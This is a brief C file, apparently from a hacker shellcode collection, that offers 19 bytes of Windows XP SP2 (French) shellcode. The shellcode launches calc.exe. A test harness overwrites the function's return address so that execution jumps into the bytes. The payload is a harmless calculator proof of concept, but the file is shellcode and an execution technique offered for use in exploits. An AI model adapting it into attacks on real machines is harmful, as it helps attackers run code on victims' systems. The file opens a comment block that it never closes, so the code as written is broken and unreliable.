/*
Author: SkuLL-HacKeR
Big Thx To :  my brothers : Pr0F.SELLiM - ThE X-HaCkEr -  Jiko  - My friends in Morocco
H0ME  : Geeksec.com  & No-exploiT
Email : My@Hotmail.iT & Wizard-skh@hotmail.com


// Win32 Shellcode Collection (calc) 19 bytes
// Shellcode Exec Calc.exe
// Tested on XP SP2 FR
#include "stdio.h"
unsigned char shellcode[] = "\xeB\x02\xBA\xC7\x93"
                            "\xBF\x77\xFF\xD2\xCC"
                            "\xE8\xF3\xFF\xFF\xFF"
                            "\x63\x61\x6C\x63";
int main ()
{
int *ret;
ret=(int *)&ret+2;
printf("Shellcode Length is : %d\n",strlen(shellcode));
(*ret)=(int)shellcode;
return 0;
}